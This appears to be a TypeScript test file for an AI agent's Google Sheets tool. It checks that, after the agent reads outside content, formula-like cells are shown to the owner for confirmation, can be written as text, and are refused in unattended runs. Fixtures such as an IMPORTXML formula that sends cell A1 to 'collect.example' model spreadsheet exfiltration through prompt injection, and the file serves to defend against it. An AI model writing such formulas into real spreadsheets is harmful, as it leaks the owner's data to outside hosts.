import { describe, it, expect, vi, beforeEach, beforeAll, afterAll } from 'vitest';
import { createSheetsTool } from './google-sheets.js';
import { startsLikeFormula, formulaCells, formulasAsText } from './sheets-formula.js';
import type { IAgent, PromptText } from '../../types/index.js';
import type { GoogleAuth } from './google-auth.js';
import { FULL_SCOPES } from './google-auth.js';
import { flattenPrompt, promptSegments } from '../../core/prompt-value.js';

vi.mock('node:dns/promises', () => ({
  default: { lookup: vi.fn(async () => dnsLookupStub()) },
}));

import { installPinnedFetchBridge, dnsLookupStub } from '../../../tests/helpers/pinned-fetch-bridge.js';

let restorePinnedFetchBridge: (() => void) | undefined;
beforeAll(() => { restorePinnedFetchBridge = installPinnedFetchBridge(); });
afterAll(() => { restorePinnedFetchBridge?.(); });

const mockFetch = vi.fn();
vi.stubGlobal('fetch', mockFetch);

function auth(): GoogleAuth {
  return {
    getAccessToken: vi.fn().mockResolvedValue('mock-token'),
    hasScope: vi.fn().mockImplementation((s: string) => FULL_SCOPES.includes(s)),
    hasOwnClientPair: vi.fn().mockReturnValue(true),
    usesServiceAccount: vi.fn().mockReturnValue(false),
  } as unknown as GoogleAuth;
}

type Taint = 'none' | 'sawUntrustedData' | 'sawExternalContentTool' | 'conversationSawUntrusted';

/** An agent whose run has (or has not) read content from outside, answering with `answer`. */
function agent(taint: Taint, answer?: string): IAgent {
  return {
    name: 'test', model: 'test-model', memory: null, tools: [], onStream: null,
    ...(taint === 'none' ? {} : { [taint]: true }),
    promptUser: answer === undefined ? undefined : vi.fn().mockResolvedValue(answer),
  } as unknown as IAgent;
}

function asked(a: IAgent): { prompt: PromptText; options: string[] } {
  const call = (a.promptUser as ReturnType<typeof vi.fn>).mock.calls[0]!;
  return { prompt: call[0] as PromptText, options: call[1] as string[] };
}

function sentValues(): unknown[][] {
  return (JSON.parse((mockFetch.mock.calls[0]![1] as { body: string }).body) as { values: unknown[][] }).values;
}

function sentUrl(): string {
  const target = mockFetch.mock.calls[0]![0] as string | URL | Request;
  return typeof target === 'string' ? target : target instanceof URL ? target.href : target.url;
}

const FETCHING = '=IMPORTXML("https://collect.example/p?d="&A1, "//a")';
const WRITTEN = { ok: true, json: async () => ({ updatedRange: 'Sheet1!B2:C3', updatedRows: 2, updatedColumns: 2, updatedCells: 4 }) };
const APPENDED = { ok: true, json: async () => ({ updates: { updatedRange: 'Sheet1!A9:B9', updatedRows: 1, updatedCells: 2 } }) };

const PLAIN_WRITE_QUESTION = 'Overwrite range "Sheet1!B2:C3" in spreadsheet sid? This will replace existing data.';

describe('a cell that starts like a formula', () => {
  it.each([
    ['=A1', true], ['  =SUM(A1:A3)', true], ['+A1', true], ['-A1', true], ['- item', true],
    ['-5', false], ['+3.5', false], ['1,5', false], ['12%', false], ['-1e3', false],
    ['Alice', false], ['', false], ['a=b', false],
    // Read as Google might normalise it: a full-width sign, an invisible character in front.
    ['＝IMPORTXML("https://x.example", "//a")', true], ['\u200b=A1', true], ['\ufeff=A1', true], ['＋A1', true],
    // …and a signed number stays a number after that (it folds, then reads as plain)…
    ['－５', false], ['\u200b-5', false], ['－１,５', false], ['\u200b+3.5', false],
    // …while a value with no sign in front is no formula, folded or not.
    ['\u200b12', false], ['Ａlice', false], ['１,５', false],
  ])('%j is counted as a formula: %s', (value, expected) => {
    expect(startsLikeFormula(value)).toBe(expected);
  });

  it('is never a value that is not a string', () => {
    expect(startsLikeFormula(5)).toBe(false);
    expect(startsLikeFormula(null)).toBe(false);
    expect(startsLikeFormula(true)).toBe(false);
  });

  it('names a written cell by its address from the range, and any other by its place in the values', () => {
    const values = [['a', '=1+1'], ['=B9', 'b']];
    expect(formulaCells(values, 'Sheet1!B2:C3', 'write')).toEqual([{ cell: 'C2', formula: '=1+1' }, { cell: 'B3', formula: '=B9' }]);
    expect(formulaCells([['=x']], "'My sheet'!$Z$10", 'write')).toEqual([{ cell: 'Z10', formula: '=x' }]);
    expect(formulaCells([['a', '=x']], 'Z1', 'write')).toEqual([{ cell: 'AA1', formula: '=x' }]);
    const byPlace = [{ cell: '1st row, 2nd value', formula: '=1+1' }, { cell: '2nd row, 1st value', formula: '=B9' }];
    expect(formulaCells(values, 'Sheet1', 'write')).toEqual(byPlace);
    expect(formulaCells(values, 'Sheet1!B:C', 'write')).toEqual(byPlace);
    expect(formulaCells(values, 'Sheet1!R2C3', 'write')).toEqual(byPlace);
    expect(formulaCells(values, 'Sheet1!B2:C3', 'append')).toEqual([{ cell: '1st new row, 2nd value', formula: '=1+1' }, { cell: '2nd new row, 1st value', formula: '=B9' }]);
  });

  it('counts the rows in English ordinals', () => {
    const cells = formulaCells(Array.from({ length: 23 }, () => ['=x']), 'Sheet1', 'append').map((c) => c.cell.split(' ')[0]);
    expect([0, 1, 2, 3, 10, 11, 12, 20, 21, 22].map((i) => cells[i])).toEqual(['1st', '2nd', '3rd', '4th', '11th', '12th', '13th', '21st', '22nd', '23rd']);
  });

  it('writes only the formula cells as text', () => {
    expect(formulasAsText([['a', '=1+1', 5], ['-x', '-5'], ['\u200b=A1']])).toEqual([['a', "'=1+1", 5], ["'-x", '-5'], ["'\u200b=A1"]]);
  });
});

describe('google_sheets after content from outside the chat', () => {
  beforeEach(() => { vi.clearAllMocks(); });

  const write = { action: 'write' as const, spreadsheet_id: 'sid', range: 'Sheet1!B2:C3', values: [['Name', FETCHING], ['=B2', 'Bob']] };

  it('shows each formula cell with its whole formula, and offers text first', async () => {
    const a = agent('sawUntrustedData', 'Write as text');
    mockFetch.mockResolvedValueOnce(WRITTEN);
    await createSheetsTool(auth).handler(write, a);
    const { prompt, options } = asked(a);
    expect(options).toEqual(['Write as text', 'Write as formulas', 'Don’t write']);
    expect(flattenPrompt(prompt)).toBe([
      PLAIN_WRITE_QUESTION,
      '',
      'This chat has read content from outside lynox, such as a web page, an email or a file. 2 of these cells start like a formula, and Google runs a formula when it is written. A formula can make Google fetch an address named in it, with data from the sheet in that address.',
      `C2: ${FETCHING}`,
      'B3: =B2',
    ].join('\n'));
    // The cell and the whole formula are values, set apart from the question's own words.
    const values = promptSegments(prompt).filter((s) => s.kind === 'value').map((s) => s.text);
    expect(values).toContain(FETCHING);
    expect(values).toContain('C2');
  });

  it('writes the formula cells as text when the owner chooses text, and every other cell as given', async () => {
    mockFetch.mockResolvedValueOnce(WRITTEN);
    const result = await createSheetsTool(auth).handler(write, agent('sawUntrustedData', 'Write as text'));
    expect(result).toContain('Data written successfully');
    expect(sentValues()).toEqual([['Name', `'${FETCHING}`], ["'=B2", 'Bob']]);
  });

  it('takes the answer by its number too', async () => {
    mockFetch.mockResolvedValueOnce(WRITTEN);
    await createSheetsTool(auth).handler(write, agent('sawUntrustedData', '1'));
    expect(sentValues()).toEqual([['Name', `'${FETCHING}`], ["'=B2", 'Bob']]);
  });

  it('writes the formulas when the owner chooses formulas', async () => {
    mockFetch.mockResolvedValueOnce(WRITTEN);
    await createSheetsTool(auth).handler(write, agent('sawUntrustedData', 'Write as formulas'));
    expect(sentValues()).toEqual(write.values);
  });

  it('writes nothing when the owner chooses not to write', async () => {
    const result = await createSheetsTool(auth).handler(write, agent('sawUntrustedData', 'Don’t write'));
    expect(result).toBe('Action cancelled by user.');
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('writes nothing for an answer that is no option', async () => {
    const result = await createSheetsTool(auth).handler(write, agent('sawUntrustedData', 'Yes'));
    expect(result).toBe('Action cancelled by user.');
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it.each(['sawExternalContentTool', 'conversationSawUntrusted'] as const)('counts content from outside by %s as well', async (taint) => {
    const a = agent(taint, 'Write as text');
    mockFetch.mockResolvedValueOnce(WRITTEN);
    await createSheetsTool(auth).handler(write, a);
    expect(asked(a).options).toEqual(['Write as text', 'Write as formulas', 'Don’t write']);
    expect(sentValues()).toEqual([['Name', `'${FETCHING}`], ["'=B2", 'Bob']]);
  });

  it('refuses in a run nobody watches, and writes nothing', async () => {
    const result = await createSheetsTool(auth).handler(write, agent('sawUntrustedData'));
    expect(result).toContain('requires user confirmation');
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('asks as always, and writes the formulas as given, before any content from outside', async () => {
    const a = agent('none', 'Yes');
    mockFetch.mockResolvedValueOnce(WRITTEN);
    await createSheetsTool(auth).handler(write, a);
    expect(asked(a).options).toEqual(['Yes', 'No']);
    expect(flattenPrompt(asked(a).prompt)).toBe(PLAIN_WRITE_QUESTION);
    expect(sentValues()).toEqual(write.values);
    expect(sentUrl()).toContain('valueInputOption=USER_ENTERED');
  });

  it('asks as always when no cell starts like a formula', async () => {
    const a = agent('sawUntrustedData', 'Yes');
    mockFetch.mockResolvedValueOnce(WRITTEN);
    await createSheetsTool(auth).handler({ ...write, values: [['Name', '-5'], ['Alice', 'Bob']] }, a);
    expect(asked(a).options).toEqual(['Yes', 'No']);
    expect(flattenPrompt(asked(a).prompt)).toBe(PLAIN_WRITE_QUESTION);
  });

  it('says "1 of these cells starts" for one cell', async () => {
    const a = agent('sawUntrustedData', 'Don’t write');
    await createSheetsTool(auth).handler({ ...write, values: [['=B2']] }, a);
    expect(flattenPrompt(asked(a).prompt)).toContain('a file. 1 of these cells starts like a formula, and Google');
  });

  it('shows five formulas, counts the rest, and then does not offer to write formulas the owner was not shown, saying why', async () => {
    const a = agent('sawUntrustedData', 'Don’t write');
    await createSheetsTool(auth).handler({ ...write, range: 'A1', values: [['=1', '=2', '=3', '=4', '=5', '=6', '=7']] }, a);
    const lines = flattenPrompt(asked(a).prompt).split('\n');
    expect(lines.slice(-7)).toEqual(['A1: =1', 'B1: =2', 'C1: =3', 'D1: =4', 'E1: =5', 'and 2 more',
      'Writing as formulas is offered only when every formula is shown here. To write them as formulas, ask in the chat to write at most 5 at a time.']);
    expect(lines[2]).toContain('7 of these cells start like a formula');
    expect(asked(a).options).toEqual(['Write as text', 'Don’t write']);
  });

  it('writes nothing when "Write as formulas" is answered though it was not offered', async () => {
    const result = await createSheetsTool(auth).handler({ ...write, range: 'A1', values: [['=1', '=2', '=3', '=4', '=5', '=IMAGE("https://x.example")']] }, agent('sawUntrustedData', 'Write as formulas'));
    expect(result).toBe('Action cancelled by user.');
    expect(mockFetch).not.toHaveBeenCalled();
  });

  it('offers to write formulas when exactly five are shown and none is hidden', async () => {
    const a = agent('sawUntrustedData', 'Don’t write');
    await createSheetsTool(auth).handler({ ...write, range: 'A1', values: [['=1', '=2', '=3', '=4', '=5']] }, a);
    expect(asked(a).options).toEqual(['Write as text', 'Write as formulas', 'Don’t write']);
    expect(flattenPrompt(asked(a).prompt)).not.toContain('more');
    expect(flattenPrompt(asked(a).prompt)).not.toContain('Writing as formulas is offered only');
  });

  it('keeps a formula whole but on one line, so it cannot draw another cell', async () => {
    const a = agent('sawUntrustedData', 'Don’t write');
    const long = `=IMPORTXML("https://collect.example/${'p'.repeat(300)}", "//a")`;
    await createSheetsTool(auth).handler({ ...write, range: 'A1', values: [[`${long}\nB1: =harmless`]] }, a);
    const values = promptSegments(asked(a).prompt).filter((s) => s.kind === 'value').map((s) => s.text);
    expect(values).toContain(`${long} B1: =harmless`);
    expect(flattenPrompt(asked(a).prompt).split('\n').at(-1)).toBe(`A1: ${long} B1: =harmless`);
  });

  it('asks the same for an append, naming the cells by their place among the new rows', async () => {
    const a = agent('sawUntrustedData', 'Write as text');
    mockFetch.mockResolvedValueOnce(APPENDED);
    const result = await createSheetsTool(auth).handler({ action: 'append', spreadsheet_id: 'sid', range: 'Sheet1!A:B', values: [['x', FETCHING]] }, a);
    expect(result).toContain('Data appended');
    expect(asked(a).options).toEqual(['Write as text', 'Write as formulas', 'Don’t write']);
    expect(flattenPrompt(asked(a).prompt).split('\n').at(-1)).toBe(`1st new row, 2nd value: ${FETCHING}`);
    expect(sentValues()).toEqual([['x', `'${FETCHING}`]]);
  });

  it('leaves format as it was: its raw requests are not read for formulas', async () => {
    const a = agent('sawUntrustedData', 'Yes');
    mockFetch.mockResolvedValueOnce({ ok: true, json: async () => ({ replies: [{}] }) });
    await createSheetsTool(auth).handler({ action: 'format', spreadsheet_id: 'sid', format_requests: [{ repeatCell: { cell: { userEnteredValue: { formulaValue: FETCHING } } } }] }, a);
    expect(asked(a).options).toEqual(['Yes', 'No']);
    expect(flattenPrompt(asked(a).prompt)).toBe('Apply batch changes to spreadsheet sid? Formatting requests can delete or overwrite cells and sheets.');
  });
});
